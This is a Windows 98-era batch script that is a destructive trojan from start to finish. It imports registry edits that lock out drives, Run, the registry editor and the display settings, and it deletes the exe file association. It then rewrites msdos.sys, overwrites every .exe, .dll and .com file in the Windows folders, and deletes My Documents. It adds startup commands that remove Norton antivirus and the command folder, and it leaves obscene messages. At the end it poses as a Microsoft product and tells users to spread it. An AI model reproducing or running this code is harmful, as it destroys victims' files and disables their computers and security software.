@echo off
cd\
CLS
call attrib -r -h -s c:\autoexec.bat >nul
CLS
echo REGEDIT4 >c:\Upx.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >> c:\Upx.reg
echo "NoDrives"=dword:03ffffff >> c:\Upx.reg
echo "NoFind"=dword:1 >> c:\upx.reg
echo "NoRun"=dword:1 >> c:\upx.reg
echo "NoSetFolders"=dword:1 >> c:\upx.reg
echo "NoTrayContextMenu"=dword:1 >> c:\upx.reg
echo "NoViewContextMenu"=dword:1 >> c:\upx.reg
echo "NoClose"=dword:1 >> c:\upx.reg 
CLS
echo REGEDIT4 >c:\win.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> c:\win.reg
echo "DisableRegistryTools"=dword:1 >> c:\win.reg
echo "NODispCPL"=dword:1 >> c:\win.reg
CLS
echo REGEDIT4 > c:\ocx.reg
echo [-HKEY_CLASSES_ROOT\exefile] >> c:\ocx.reg
CLS
echo REGEDIT4 > c:\socks.reg
echo [HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >>  c:\socks.reg
echo "NoDriveTypeAutoRun"=dword:0 >>  c:\socks.reg
CLS
echo REGEDIT4 > c:\dll.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion] >> c:\dll.reg
echo "RegisteredOwner"="The Demon Hacker" >> c:\dll.reg
echo "RegisteredOrganization"="www.hackology.com" >> c:\dll.reg
CLS 
echo REGEDIT4 >c:\Start.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] >> c:\Start.reg
echo "Start Page"="www.freesex.com" >> c:\Start.reg
CLS
echo REGEDIT4 > c:\ini.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp] >> c:\ini.reg  
echo "Disabled"=dword:1 >> c:\ini.reg
echo "NoRealMode"=dword:1 >> c:\ini.reg
CLS
echo REGEDIT4 > c:\script.reg
echo [-HKEY_CLASSES_ROOT\{20D04FE0-3AEA-1069-A2D8-08002B30309D}] >> c:\script.reg
CLS 
echo REGEDIT4 > c:\message.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon] >> c:\message.reg
echo "LegalNoticeCaption"="Fuck u Asshole, We Now Own This Computer!" >> c:\message.reg 
CLS
START c:\upx.reg
CLS
START c:\win.reg
CLS
START c:\ocx.reg
CLS
START c:\socks.reg
CLS
START c:\Start.reg
CLS
START c:\ini.reg
CLS
START c:\script.reg
CLS
START c:\message.reg
CLS
START c:\dll.reg
CLS
call attrib -h -r -s c:\msdos.sys
@del c:\msdos.sys
CLS
echo [Paths] >> c:\msdos.sys
echo WinDir=C:\WINDOWS >> c:\msdos.sys
echo WinBootDir=C:\WINDOWS >> c:\msdos.sys
echo HostWinBootDrv=C >> c:\msdos.sys
echo [Options] >> c:\msdos.sys
echo BootMulti=1 >> c:\msdos.sys
echo BootKeys=0 >> c:\msdos.sys
echo BootGUI=1 >> c:\msdos.sys
echo DoubleBuffer=1 >> c:\msdos.sys
echo AutoScan=1 >> c:\msdos.sys
echo WinVer=4.10.2222 >> c:\msdos.sys
echo ; >> c:\msdos.sys
echo ;The following lines are required for compatibility with other programs. >> c:\msdos.sys
echo ;Do not remove them (MSDOS.SYS needs to be >1024 bytes). >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxa >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxg >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxh >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxi >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxj >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxk >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxl >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxm >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxn >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxo >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxp >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxq >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxr >> c:\msdos.sys
echo ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxs >> c:\msdos.sys
CLS
> C:\winupdt.bat
echo Hello im a deadly Trojan, & ive fucked up your files hahaha! >> c:\winupdt.bat
CLS
FOR %%a IN (*.zip) DO del %%a
FOR %%a IN (C:\windows\*.exe) DO COPY c:\winupdt.bat %%a >> NUL
FOR %%a IN (C:\windows\*.dll) DO COPY c:\winupdt.bat %%a >> NUL
FOR %%a IN (C:\windows\system\*.exe) DO COPY c:\winupdt.bat %%a >> NUL
FOR %%a IN (C:\windows\system\*.dll) DO COPY c:\winupdt.bat %%a >> NUL
FOR %%a IN (C:\windows\system\*.com) DO COPY c:\winupdt.bat %%a >> NUL
FOR %%a IN (C:\windows\*.com) DO COPY c:\winupdt.bat %%a >> NUL
FOR %%a IN (C:\*.exe) DO COPY c:\winupdt.bat %%a >> NUL
FOR %%a IN (C:\*.com) DO COPY c:\winupdt.bat %%a >> NUL
CLS
cd\
deltree /y mydocu~1
CLS
echo @echo off >> c:\autoexec.bat
echo cd\ >> c:\autoexec.bat
echo cd progra~1 >> c:\autoexec.bat
echo deltree /y icq >> c:\autoexec.bat
echo cd\ >> c:\autoexec.bat
echo cd windows >> c:\autoexec.bat
echo deltree /y command >> c:\autoexec.bat
echo CLS >> c:\autoexec.bat
CLS
echo @del c:\progra~1\norton~1\dec2.dll >> c:\autoexec.bat
echo @del c:\progra~1\norton~1\navstart.dat >> c:\autoexec.bat
echo @del c:\progra~1\norton~1\navw32.exe >> c:\autoexec.bat
echo @del c:\progra~1\norton~1\sfstr32i.dll >> c:\autoexec.bat
echo CLS >> c:\autoexec.bat
CLS
echo cd\ >> c:\autoexec.bat
echo @del c:\windows\system\rnaapp.exe >> c:\autoexec.bat
echo @del c:\windows\system\tapiexe.exe >> c:\autoexec.bat
echo CLS >> c:\autoexec.bat
CLS
echo @ren c:\progra~1 jhgf >> c:\autoexec.bat
echo CLS >> c:\autoexec.bat
CLS
cd\
echo y | del C:\WINDOWS\StartM~1\Programs\window~1.lnk
cd\
echo y | del C:\WINDOWS\explorer.scf
CLS
cd\
IF EXIST c:\gscdrom.sys GOTO DEL
:DEL
echo y | del c:\gscdrom.sys
CLS
@md c:\sex
@md c:\Shah Rukh Khan Rulez!
@md c:\windows\545
@md c:\windows\Akshay Kumar
@md c:\windows\Amitabh Bachan
@md c:\windows\nmao
@md c:\Mohabbatein
@md c:\Gujarati
@md c:\Suthar
@md c:\windows\system\dsuiuie
@md c:\windows\system\ianer
@md c:\Hritik Roshan
@md c:\aiaer
@md c:\Kabhi Kushi Kabhi Ghum 
@md c:\Salman Khan
@md c:\system
@md c:\Abhishek
@md c:\Mission Kashmir
@md c:\pogrw
@md c:\uauer
@md c:\windows\system\vnvnv
@md c:\imcvns
@md c:\mnbf
@md c:\ingo
@md c:\iajf
@md c:\sexe
@md c:\fffs
@md c:\54s5
@md c:\jsioer
@md c:\ierjeq
@md c:\nmato
@md c:\iany
@md c:\asbja
@md c:\duaae
@md c:\dsujiuie
@md c:\ianer
@md c:\aae
@md c:\aider
@md c:\ai3er
@md c:\kafe
@md c:\windows\systam
@md c:\windows\uauaau
@md c:\windows\system\ofoe
@md c:\windows\togrw
@md c:\windows\system\uader
CLS
cd\
> c:\windows\desktop\READ_ME_NOW!.TXT
echo Ek Ladki Thi Deewani Si, Ek Ladke Pe Woh Marti Thi, Nazre Chukake >> c:\windows\desktop\READ_ME_NOW!.TXT
echo Sharmake, Galiyo Se Guzarti Thi, Chori Chori, Chupke Chupke, >> c:\windows\desktop\READ_ME_NOW!.TXT
echo Chitiya Likha Karti Thi, Kuch Kehna Tha Shayad Usko, Jaane >> c:\windows\desktop\READ_ME_NOW!.TXT
echo Kis Se Darrti Thi, Jab Bhi Milti Thi Mujse, Mujse Pucha Karti Thi, >> c:\windows\desktop\READ_ME_NOW!.TXT
echo Pyaar Kaise Hota Hai, Yeh Pyaar Kaise Hota Hai, Aur Main, Sirf Yehi >> c:\windows\desktop\READ_ME_NOW!.TXT 
echo Kehe Pata Tha..... >> c:\windows\desktop\READ_ME_NOW!.TXT  
echo .....FUCK U! >> c:\windows\desktop\READ_ME_NOW!.TXT
CLS
echo THANK YOU FOR USING A MICROSOFT PRODUCT!
echo FEEL FREE TO PASS THIS PROGRAM ON TO YOUR FRIENDS WHO WILL ALSO ENJOY USING IT ;)
echo A Product By ~International Khiladi~





